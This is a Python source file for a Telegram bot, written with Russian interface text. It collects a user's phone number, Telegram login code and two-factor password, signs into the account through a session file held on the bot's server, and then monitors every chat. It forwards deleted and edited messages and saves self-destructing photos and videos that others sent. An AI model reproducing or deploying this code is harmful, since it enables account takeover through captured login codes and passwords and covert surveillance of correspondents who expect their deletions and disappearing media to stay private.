import os
import asyncio
import logging
from datetime import datetime
from telethon import TelegramClient, events
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError
from telethon.tl.custom import Button
from telethon.tl.types import MessageMediaPhoto, MessageMediaVideo, MessageMediaDocument
import nest_asyncio

nest_asyncio.apply()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
API_ID = int(os.environ.get('API_ID'))
API_HASH = os.environ.get('API_HASH')

bot = TelegramClient('bot', API_ID, API_HASH)

# Хранилище сессий и данных
user_sessions = {}  # {user_id: {'phone': '...', 'client': ..., 'step': '...'}}
authorized_users = set()
ACCESS_PIN = "5482"
message_cache = {}  # Кэш сообщений для отслеживания удалений
user_contacts = {}  # Сохранённые контакты пользователей

@bot.on(events.NewMessage)
async def handler(event):
    user_id = event.sender_id
    text = event.message.text.strip()

    # === ПИН-КОД ===
    if user_id not in authorized_users:
        if text == ACCESS_PIN:
            authorized_users.add(user_id)
            await event.reply("✅ **Пин-код верный!** Используй /start")
        else:
            await event.reply("🔐 **Введите пин-код:**\n`5482`")
        return

    # === МЕНЮ ===
    if text == "/start":
        await event.reply(
            "👋 **Добро пожаловать!**\n\n"
            "Выбери действие:",
            buttons=[
                [Button.text("📞 Войти по номеру", resize=True)],
                [Button.request_contact("📱 Отправить мой номер")],
                [Button.text("❓ Помощь")]
            ]
        )
        return

    # === ПОМОЩЬ ===
    if text == "❓ Помощь":
        await event.reply(
            "📚 **Помощь**\n\n"
            "1️⃣ **Пин-код:** 5482\n"
            "2️⃣ **Вход по номеру:** нажми кнопку и введи номер\n"
            "3️⃣ **Отправить контакт:** нажми кнопку и подтверди\n"
            "4️⃣ **Мониторинг:** после входа бот следит за сообщениями"
        )
        return

    # === ЗАПРОС НОМЕРА ===
    if text == "📞 Войти по номеру":
        user_sessions[user_id] = {'step': 'waiting_phone'}
        await event.reply("📞 **Введи номер в формате:**\n`+79001234567`")
        return

    # === ПОЛУЧЕНИЕ НОМЕРА И ОТПРАВКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_phone':
        phone = text
        user_sessions[user_id]['phone'] = phone
        user_sessions[user_id]['step'] = 'waiting_code'
        
        await event.reply("🔄 **Отправляю запрос кода...**")
        
        try:
            client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
            await client.connect()
            
            sent_code = await client.send_code_request(phone)
            
            user_sessions[user_id]['client'] = client
            user_sessions[user_id]['code_hash'] = sent_code.phone_code_hash
            
            await event.reply(
                "✅ **Код отправлен!**\n\n"
                "📨 Проверь Telegram — там пришёл 5-значный код\n"
                "⏳ Код действителен 2 минуты\n"
                "✍️ **Введи код сюда:**"
            )
            
        except Exception as e:
            await event.reply(f"❌ **Ошибка:** {e}\nПроверь номер и попробуй снова.")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === ПРОВЕРКА КОДА ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_code':
        code = text.strip()
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(session['phone'], code, phone_code_hash=session['code_hash'])
            
            me = await client.get_me()
            await event.reply(
                f"✅ **Успешный вход!**\n\n"
                f"👤 Аккаунт: @{me.username}\n"
                f"🆔 ID: {me.id}\n\n"
                f"🔍 **Запускаю мониторинг...**"
            )
            
            # Удаляем временные данные
            if user_id in user_sessions:
                del user_sessions[user_id]
            
            # Запускаем мониторинг
            asyncio.create_task(monitor_user_chats(user_id, client))
            
        except SessionPasswordNeededError:
            user_sessions[user_id]['step'] = 'waiting_2fa'
            await event.reply("🔐 **Требуется двухфакторный пароль.**\nВведи его:")
            
        except PhoneCodeInvalidError:
            await event.reply("❌ **Неверный код!**\nПопробуй ещё раз:")
            
        except PhoneCodeExpiredError:
            await event.reply("⌛ **Код истёк.** Начни заново.")
            if user_id in user_sessions:
                del user_sessions[user_id]
            
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")
            if user_id in user_sessions:
                del user_sessions[user_id]
        return

    # === 2FA ===
    if user_id in user_sessions and user_sessions[user_id].get('step') == 'waiting_2fa':
        password = text
        session = user_sessions[user_id]
        client = session['client']
        
        try:
            await client.sign_in(password=password)
            me = await client.get_me()
            await event.reply(f"✅ **Вход выполнен!**\n👤 Аккаунт: @{me.username}")
            if user_id in user_sessions:
                del user_sessions[user_id]
            asyncio.create_task(monitor_user_chats(user_id, client))
        except Exception as e:
            await event.reply(f"❌ Ошибка: {e}")

# === ОБРАБОТКА ПОЛУЧЕННОГО КОНТАКТА ===
@bot.on(events.NewMessage(func=lambda e: e.message.contact))
async def contact_handler(event):
    """Обрабатывает полученный контакт"""
    user_id = event.sender_id
    contact = event.message.contact
    
    # Сохраняем контакт
    user_contacts[user_id] = {
        'phone': contact.phone_number,
        'first_name': contact.first_name,
        'last_name': contact.last_name
    }
    
    # Отправляем подтверждение с кнопкой подтверждения
    await event.reply(
        f"📱 **Контакт получен!**\n\n"
        f"Имя: {contact.first_name} {contact.last_name or ''}\n"
        f"Номер: `{contact.phone_number}`\n\n"
        f"⚠️ **Этот номер будет использован для входа в аккаунт.**\n"
        f"Подтверждаешь?",
        buttons=[
            [Button.text("✅ Да, подтверждаю", resize=True)],
            [Button.text("❌ Нет, отмена")]
        ]
    )

# === ПОДТВЕРЖДЕНИЕ КОНТАКТА ===
@bot.on(events.NewMessage)
async def confirm_contact_handler(event):
    user_id = event.sender_id
    text = event.message.text
    
    if text == "✅ Да, подтверждаю" and user_id in user_contacts:
        contact = user_contacts[user_id]
        
        # Начинаем процесс входа с сохранённым номером
        user_sessions[user_id] = {'step': 'waiting_phone'}
        
        # Искусственно вызываем обработчик номера
        class FakeEvent:
            def __init__(self, uid, txt):
                self.sender_id = uid
                self.message = type('obj', (object,), {'text': txt})
        
        await handler(FakeEvent(user_id, contact['phone']))
        
    elif text == "❌ Нет, отмена" and user_id in user_contacts:
        del user_contacts[user_id]
        await event.reply("❌ Отменено. Можешь начать заново.")

# === МОНИТОРИНГ ===
async def monitor_user_chats(user_id, client):
    """Мониторит удалённые, изменённые и истекающие сообщения"""
    
    await bot.send_message(user_id, "🔍 **Мониторинг запущен!**\n\nОтслеживаю:\n• Удалённые сообщения\n• Изменённые сообщения\n• Истекающие фото/видео")
    
    # ===== КЭШИРОВАНИЕ СООБЩЕНИЙ =====
    @client.on(events.NewMessage)
    async def on_new(event):
        """Кэшируем все новые сообщения"""
        cache_key = f"{event.chat_id}_{event.message.id}"
        
        # Определяем тип сообщения
        msg_type = "text"
        if event.message.photo:
            msg_type = "photo"
        elif event.message.video:
            msg_type = "video"
        elif event.message.video_note:
            msg_type = "video_note"
        elif event.message.voice:
            msg_type = "voice"
        
        # Получаем информацию о чате
        try:
            chat = await client.get_entity(event.chat_id)
            chat_name = getattr(chat, 'title', getattr(chat, 'first_name', 'Чат'))
        except:
            chat_name = f"чат {event.chat_id}"
        
        # Получаем информацию об отправителе
        try:
            sender = await event.get_sender()
            sender_name = getattr(sender, 'first_name', 'Неизвестно')
        except:
            sender_name = "Неизвестно"
        
        # Проверяем, истекающее ли сообщение
        if hasattr(event.message, 'ttl_seconds') and event.message.ttl_seconds:
            ttl = event.message.ttl_seconds
            
            await bot.send_message(
                user_id,
                f"⏳ **ИСТЕКАЮЩЕЕ СООБЩЕНИЕ**\n\n"
                f"📌 Чат: {chat_name}\n"
                f"👤 От: {sender_name}\n"
                f"📝 Тип: {msg_type}\n"
                f"⏱ Истечёт через: {ttl} сек\n"
                f"🔍 Сохраняю перед удалением..."
            )
            
            # Сохраняем медиа
            if event.message.photo or event.message.video or event.message.video_note:
                try:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"expiring_{timestamp}_{msg_type}.dat"
                    path = await event.message.download_media(file=filename)
                    
                    await bot.send_file(
                        user_id,
                        path,
                        caption=f"📸 **Сохранённое истекающее {msg_type}**\nИз чата: {chat_name}\nОт: {sender_name}"
                    )
                    
                    os.remove(path)
                    
                except Exception as e:
                    await bot.send_message(user_id, f"❌ Ошибка сохранения: {e}")
        
        # Сохраняем в кэш
        message_cache[cache_key] = {
            'text': event.message.text or f"[{msg_type}]",
            'time': datetime.now().isoformat(),
            'chat_id': event.chat_id,
            'chat_name': chat_name,
            'sender': sender_name,
            'msg_type': msg_type
        }
        
        # Ограничиваем кэш
        if len(message_cache) > 1000:
            keys = list(message_cache.keys())[:200]
            for k in keys:
                del message_cache[k]

    # ===== УДАЛЁННЫЕ СООБЩЕНИЯ =====
    @client.on(events.MessageDeleted)
    async def on_delete(event):
        """Отслеживает удалённые сообщения"""
        for msg_id in event.deleted_ids:
            cache_key = f"{event.chat_id}_{msg_id}"
            if cache_key in message_cache:
                msg = message_cache[cache_key]
                
                await bot.send_message(
                    user_id,
                    f"🗑 **УДАЛЕНО**\n\n"
                    f"📌 Чат: {msg['chat_name']}\n"
                    f"👤 От: {msg['sender']}\n"
                    f"📝 {msg['text'][:200]}\n"
                    f"⏰ Было: {msg['time'][:19]}"
                )
                
                del message_cache[cache_key]

    # ===== ИЗМЕНЁННЫЕ СООБЩЕНИЯ =====
    @client.on(events.MessageEdited)
    async def on_edit(event):
        """Отслеживает изменённые сообщения"""
        cache_key = f"{event.chat_id}_{event.message.id}"
        if cache_key in message_cache:
            old_text = message_cache[cache_key]['text']
            new_text = event.message.text
            
            if old_text != new_text:
                await bot.send_message(
                    user_id,
                    f"✏️ **ИЗМЕНЕНО**\n\n"
                    f"📌 Чат: {message_cache[cache_key]['chat_name']}\n"
                    f"👤 От: {message_cache[cache_key]['sender']}\n"
                    f"📝 Было: {old_text[:200]}\n"
                    f"📝 Стало: {new_text[:200]}"
                )
                
                message_cache[cache_key]['text'] = new_text
                message_cache[cache_key]['time'] = datetime.now().isoformat()

    await client.run_until_disconnected()

# === ЗАПУСК ===
async def main():
    await bot.start(bot_token=BOT_TOKEN)
    me = await bot.get_me()
    logger.info(f"✅ Бот @{me.username} запущен! Пин-код: 5482")
    logger.info("📱 Кнопка отправки контакта активна")
    logger.info("🔍 Мониторинг: удалённые, изменённые, истекающие")
    await bot.run_until_disconnected()

if __name__ == "__main__":
    asyncio.run(main())